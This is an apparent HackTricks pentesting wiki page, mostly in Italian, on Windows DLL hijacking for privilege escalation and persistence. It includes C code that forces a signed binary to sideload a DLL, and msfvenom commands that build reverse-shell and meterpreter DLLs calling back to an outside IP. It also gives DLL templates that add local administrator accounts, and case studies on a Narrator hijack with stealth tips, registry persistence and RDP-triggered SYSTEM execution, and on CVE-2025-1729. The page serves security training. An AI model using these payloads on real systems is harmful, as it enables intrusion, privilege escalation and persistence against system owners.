# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

DLL Hijacking comporta la manipolazione di un'applicazione affidabile affinché carichi una DLL dannosa. Questo termine include diverse tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene impiegato principalmente per code execution, per ottenere persistence e, meno comunemente, privilege escalation. Nonostante qui l'attenzione sia sull'escalation, il metodo di hijacking rimane lo stesso a prescindere dall'obiettivo.

### Tecniche comuni

Vengono impiegati diversi metodi per il DLL hijacking, ognuno con la sua efficacia a seconda della strategia di caricamento delle DLL dell'applicazione:

1. **DLL Replacement**: Sostituire una DLL genuina con una malevola, eventualmente usando DLL Proxying per preservare la funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: Inserire la DLL malevola in un percorso di ricerca che viene consultato prima di quello legittimo, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare una DLL malevola che un'applicazione caricherà pensando che sia una DLL richiesta ma assente.
4. **DLL Redirection**: Modificare i parametri di ricerca come %PATH% o i file .exe.manifest / .exe.local per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una malevola nella directory WinSxS, metodo spesso associato a DLL side-loading.
6. **Relative Path DLL Hijacking**: Posizionare la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, simile alle tecniche di Binary Proxy Execution.

## Trovare DLL mancanti

The most common way to find missing Dlls inside a system is running [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, **setting** the **following 2 filters**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

and just show the **File System Activity**:

![](<../../../images/image (153).png>)

Se stai cercando **missing dlls in general** lascia questo in esecuzione per alcuni **seconds**.  
Se stai cercando una **missing dll inside an specific executable** dovresti impostare **un altro filtro come "Process Name" "contains" `<exec name>`, eseguirlo e fermare la cattura degli eventi**.

## Sfruttare DLL mancanti

Per poter escalate privileges, la miglior possibilità è riuscire a **scrivere una dll che un processo privilegiato tenterà di caricare** in uno dei **punti in cui verrà cercata**. Quindi, potremo **scrivere** una dll in una **cartella** dove la **dll viene cercata prima** della cartella dove si trova la **dll originale** (caso particolare), oppure potremo **scrivere in una cartella dove la dll verrà cercata** e la dll originale **non esiste** in nessuna cartella.

### Ordine di ricerca delle DLL

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Le applicazioni Windows cercano le DLL seguendo una serie di percorsi di ricerca predefiniti, rispettando una sequenza particolare. Il problema del DLL hijacking sorge quando una DLL malevola viene posizionata strategicamente in una di queste directory, assicurandosi di essere caricata prima della DLL autentica. Una soluzione per prevenire questo è garantire che l'applicazione usi percorsi assoluti quando fa riferimento alle DLL di cui ha bisogno.

Puoi vedere l'ordine di ricerca delle DLL sui sistemi a 32-bit qui sotto:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Questo è l'ordine di ricerca **di default** con **SafeDllSearchMode** abilitato. Quando è disabilitato la current directory sale al secondo posto. Per disabilitare questa funzione, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (di default è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH** la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **una dll potrebbe essere caricata indicando il percorso assoluto invece che solamente il nome**. In quel caso quella dll verrà **cercata solo in quel percorso** (se la dll ha delle dipendenze, esse verranno cercate come se fossero state caricate solo per nome).

Esistono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il DLL search path di un processo appena creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS durante la creazione del processo con le API native di ntdll. Fornendo qui una directory controllata dall'attaccante, un processo di destinazione che risolve una DLL importata per nome (senza percorso assoluto e senza usare i flag di caricamento sicuro) può essere costretto a caricare una DLL malevola da quella directory.

Concetto chiave
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Note/limitazioni
- Questo influenza il processo figlio che viene creato; è differente da SetDllDirectory, che influenza solo il processo corrente.
- Il target deve importare o LoadLibrary una DLL per nome (nessun percorso assoluto e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e percorsi assoluti hardcoded non possono essere hijackati. Forwarded exports e SxS possono alterare la precedenza.

Minimal C example (ntdll, wide strings, gestione degli errori semplificata):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Sì, i requisiti sono complicati da trovare perché **di default è piuttosto strano trovare un eseguibile privilegiato a cui manca una DLL** ed è ancora **più strano avere permessi di scrittura su una cartella del system path** (di norma non è possibile). Tuttavia, in ambienti mal configurati questo è possibile.\
Nel caso tu sia fortunato e soddisfi i requisiti, potresti dare un'occhiata al progetto [UACME](https://github.com/hfiref0x/UACME). Anche se lo **scopo principale del progetto è bypass UAC**, potresti trovare lì una **PoC** di Dll hijaking per la versione di Windows che puoi usare (probabilmente cambiando solo il percorso della cartella dove hai i permessi di scrittura).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare gli import di un eseguibile e gli export di una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abuse Dll Hijacking to escalate privileges** avendo i permessi di scrittura in una **cartella del PATH di sistema** verifica:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) controllerà se hai permessi di scrittura su qualsiasi cartella all'interno del system PATH.\
Altri tool automatici interessanti per scoprire questa vulnerabilità sono le **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll_.

### Example

Nel caso tu trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo è **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. Comunque, nota che Dll Hijacking è utile per [escalare da Medium Integrity level a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** all'interno di questo studio sul dll hijacking focalizzato sull'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll basici** che potrebbero essere utili come **template** o per creare una **dll con funzioni non richieste esportate**.

## **Creazione e compilazione di Dll**

### **Dll Proxifying**

Fondamentalmente un **Dll proxy** è una DLL in grado di **eseguire il tuo codice malevolo quando viene caricata** ma anche di **esporsi** e **funzionare** come previsto **relayando tutte le chiamate verso la libreria reale**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che vuoi proxify e **generare una proxified dll** o **indicare la Dll** e **generare una proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86, non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il proprio

Nota che in diversi casi la Dll che compili deve **export several functions** che verranno caricate dal victim process; se queste functions non esistono il **binary non sarà in grado di caricarle** e l'**exploit fallirà**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio di DLL C++ con creazione utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa con thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso di studio: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continua a cercare, all'avvio, una DLL di localizzazione prevedibile e specifica per lingua che può essere hijacked per arbitrary code execution e persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se una DLL scrivibile controllata dall'attaccante esiste nel percorso OneCore, viene caricata ed eseguita `DllMain(DLL_PROCESS_ATTACH)`. Non sono richieste esportazioni.

Discovery with Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso sopra.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silenzio OPSEC
- Un hijack naive farà parlare/evidenziare l'UI. Per restare silenziosi, all'attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e `SuspendThread` su di esso; continua nel tuo thread. Vedi il PoC per il codice completo.

Trigger e persistenza tramite configurazione Accessibility
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, avviando Narrator viene caricata la DLL piantata. Sul secure desktop (schermata di accesso), premi CTRL+WIN+ENTER per avviare Narrator.

Esecuzione SYSTEM innescata via RDP (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Effettua RDP verso l'host; nella schermata di accesso premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul secure desktop.
- L'esecuzione si interrompe quando la sessione RDP si chiude — inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di un Accessibility Tool (AT) integrato (es. CursorIndicator), modificarla per puntare a un binario/DLL arbitrario, importarla e poi impostare `configuration` su quel nome AT. Questo proxy consente l'esecuzione arbitraria tramite il framework Accessibility.

Note
- Scrivere sotto `%windir%\System32` e modificare valori HKLM richiede privilegi amministrativi.
- Tutta la logica del payload può risiedere in `DLL_PROCESS_ATTACH`; non sono necessarie esportazioni.

## Caso di studio: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra **Phantom DLL Hijacking** nel TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.

### Dettagli della vulnerabilità

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Implementazione dell'exploit

Un attaccante può posizionare uno stub `hostfxr.dll` malevolo nella stessa directory, sfruttando la DLL mancante per ottenere esecuzione di codice nel contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flusso d'attacco

1. Come utente standard, posizionare `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendere che l'attività pianificata venga eseguita alle 9:30 AM nel contesto dell'utente corrente.
3. Se un amministratore è connesso quando l'attività viene eseguita, la DLL malevola viene eseguita nella sessione dell'amministratore con integrità media.
4. Concatenare tecniche standard di UAC bypass per elevare dall'integrità media ai privilegi SYSTEM.

## Riferimenti

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)


{{#include ../../../banners/hacktricks-training.md}}
